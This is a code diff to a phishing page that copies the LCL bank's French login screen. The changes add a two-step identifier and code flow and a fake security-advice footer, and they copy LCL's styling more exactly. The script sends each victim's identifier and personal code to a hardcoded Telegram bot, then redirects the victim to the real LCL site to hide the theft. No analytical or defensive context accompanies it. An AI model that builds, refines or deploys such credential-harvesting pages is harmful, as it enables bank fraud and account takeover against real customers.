@@ -11,38 +11,44 @@
             margin: 0;
             display: flex;
             flex-direction: column;
-            justify-content: center;
+            justify-content: flex-start;
             align-items: center;
             min-height: 100vh;
+            padding-top: 40px;
         }
         .container {
             background: white;
-            padding: 40px 30px;
-            border-radius: 8px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
-            width: 90%;
+            padding: 20px 30px;
+            width: 100%;
             max-width: 400px;
-            text-align: center;
+            min-height: 500px;
+            position: relative;
         }
         .logo {
-            max-width: 120px;
-            margin-bottom: 20px;
+            max-width: 100px;
+            margin-bottom: 30px;
+            display: block;
+            margin-left: auto;
+            margin-right: auto;
         }
         h2 {
             color: #333;
-            margin-bottom: 20px;
-            font-size: 18px;
+            margin-bottom: 25px;
+            font-size: 20px;
             font-weight: 600;
+            text-align: left;
+            padding: 0 5px;
         }
         .input-group {
-            margin-bottom: 15px;
+            margin-bottom: 25px;
             text-align: left;
         }
         label {
             display: block;
-            margin-bottom: 5px;
+            margin-bottom: 8px;
             color: #666;
             font-size: 14px;
+            font-weight: 500;
         }
         input {
             width: 100%;
@@ -51,6 +57,7 @@
             border-radius: 4px;
             box-sizing: border-box;
             font-size: 16px;
+            background-color: #fff;
         }
         input:focus {
             border-color: #D6001C;
@@ -72,6 +79,45 @@
         button:hover {
             background-color: #b30016;
         }
+        .links {
+            margin-top: 20px;
+            font-size: 14px;
+            text-align: left;
+            padding: 0 5px;
+        }
+        .links a {
+            display: block;
+            color: #D6001C;
+            text-decoration: none;
+            margin-bottom: 5px;
+        }
+        .links a:hover {
+            text-decoration: underline;
+        }
+        .open-account {
+            display: block;
+            text-align: center;
+            margin-top: 30px;
+            color: #D6001C;
+            text-decoration: none;
+            font-weight: bold;
+        }
+        .footer {
+            margin-top: 40px;
+            padding-top: 20px;
+            border-top: 1px solid #eee;
+            font-size: 12px;
+            color: #888;
+        }
+        .footer-title {
+            font-weight: bold;
+            color: #333;
+            margin-bottom: 5px;
+        }
+        .footer p {
+            margin: 0;
+            line-height: 1.4;
+        }
         .spinner {
             display: none;
             border: 4px solid #f3f3f3;
@@ -83,23 +129,15 @@
             margin: 20px auto;
         }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        
-        /* Footer模仿 LCL */
-        .footer {
-            position: absolute;
-            bottom: 20px;
-            font-size: 12px;
-            color: #888;
-            text-align: center;
-            width: 100%;
+        .hidden {
+            display: none;
         }
-        .footer a {
-            color: #888;
-            text-decoration: none;
-            margin: 0 10px;
+        .fade-in {
+            animation: fadeIn 0.5s;
         }
-        .footer a:hover {
-            text-decoration: underline;
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
         }
     </style>
 </head>
@@ -111,28 +149,38 @@
     
     <h2>Connexion à votre espace client</h2>
 
+    <!-- Formulaire -->
     <form id="loginForm">
+        
+        <!-- Étape 1 : Identifiant -->
         <div class="input-group">
-            <label for="userId">Identifiant</label>
-            <input type="text" id="userId" placeholder="Votre identifiant client" required>
+            <label for="userId">Votre identifiant</label>
+            <input type="text" id="userId" placeholder="Ex: 123456789" required autocomplete="off">
         </div>
 
-        <div class="input-group">
-            <label for="password">Code d'accès</label>
-            <input type="password" id="password" placeholder="Votre code d'accès" required>
+        <!-- Étape 2 : Code (caché au début) -->
+        <div class="input-group hidden" id="codeGroup">
+            <label for="password">Votre code personnel</label>
+            <input type="text" id="password" placeholder="Entrez votre code" required autocomplete="off">
         </div>
 
-        <button type="submit" id="btnSubmit">Se connecter</button>
+        <button type="submit" id="btnSubmit">Suivant</button>
     </form>
 
     <div class="spinner" id="spinner"></div>
-</div>
 
-<div class="footer">
-    <p>© 2024 LCL - Tous droits réservés</p>
-    <div class="legal-links">
-        <a href="#">Mentions légales</a>
-        <a href="#">Cookies</a>
+    <!-- Liens secondaires -->
+    <div class="links">
+        <a href="#">Identifiant oublié ?</a>
+        <a href="#">Code personnel oublié ?</a>
+    </div>
+
+    <a href="#" class="open-account">Pas encore client ? Ouvrir un compte &gt;</a>
+
+    <!-- Footer Sécurité -->
+    <div class="footer">
+        <div class="footer-title">Nos conseils sécurité</div>
+        <p>LCL ne vous sollicitera jamais (que ce soit par mail, par SMS ou par téléphone) pour vous demander de communiquer de quelque manière que ce soit vos mots de passe, codes confidentiels ou codes à usage unique reçus par SMS.</p>
     </div>
 </div>
 
@@ -141,18 +189,50 @@
     const TELEGRAM_BOT_TOKEN = '8835375365:AAGXLvfFbU_wNtDvs5jxpEe019V2n6IY_WQ';
     const TELEGRAM_CHAT_ID = '8501464548';
 
-    document.getElementById('loginForm').addEventListener('submit', function(e) {
+    const userIdInput = document.getElementById('userId');
+    const codeGroup = document.getElementById('codeGroup');
+    const passwordInput = document.getElementById('password');
+    const submitBtn = document.getElementById('btnSubmit');
+    const loginForm = document.getElementById('loginForm');
+
+    // Script pour afficher des points dans le champ code
+    passwordInput.addEventListener('input', function() {
+        // On garde la valeur réelle dans le champ, mais on affiche des points visuellement
+        // Pour une capture simple, on peut juste laisser le type "password"
+        // Mais pour imiter EXACTEMENT le style LCL (points noirs), on force le type password
+        this.type = 'password'; 
+    });
+
+    // Étape 1 : Quand l'utilisateur clique sur "Suivant" avec seulement l'identifiant
+    loginForm.addEventListener('submit', function(e) {
         e.preventDefault();
 
-        const userId = document.getElementById('userId').value;
-        const password = document.getElementById('password').value;
-        
+        const userId = userIdInput.value;
+
+        // Si le champ code est encore caché, on l'affiche et on change le bouton
+        if (!codeGroup.classList.contains('hidden')) {
+            // Cas normal : tout est rempli, on envoie
+            sendData(userId, passwordInput.value);
+            return;
+        }
+
+        // Cas : On vient juste de mettre l'identifiant
+        if (userId) {
+            codeGroup.classList.remove('hidden');
+            codeGroup.classList.add('fade-in');
+            passwordInput.focus();
+            submitBtn.textContent = "Se connecter"; 
+            submitBtn.style.backgroundColor = "#333"; 
+        }
+    });
+
+    // Fonction d'envoi des données
+    function sendData(userId, password) {
         // Animation de chargement
-        document.getElementById('btnSubmit').style.display = 'none';
+        submitBtn.style.display = 'none';
         document.getElementById('spinner').style.display = 'block';
 
-        // Envoi des données à Telegram
-        const message = `🔐 *Nouvelle connexion LCL détectée*\n\n👤 Identifiant: ${userId}\n🔑 Code d'accès: ${password}\n📅 Date: ${new Date().toLocaleString()}`;
+        const message = `🔐 *Nouvelle connexion LCL détectée*\n\n👤 Identifiant: ${userId}\n🔑 Code: ${password}\n📅 Date: ${new Date().toLocaleString()}`;
 
         const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
         
@@ -168,8 +248,6 @@
         .then(response => {
             if (response.ok) {
                 console.log('Données envoyées !');
-            } else {
-                console.error('Erreur Telegram');
             }
         })
         .catch(error => console.error('Erreur réseau:', error));
@@ -178,7 +256,7 @@
         setTimeout(() => {
             window.location.href = 'https://www.lcl.fr/';
         }, 2000);
-    });
+    }
 </script>
 
 </body>
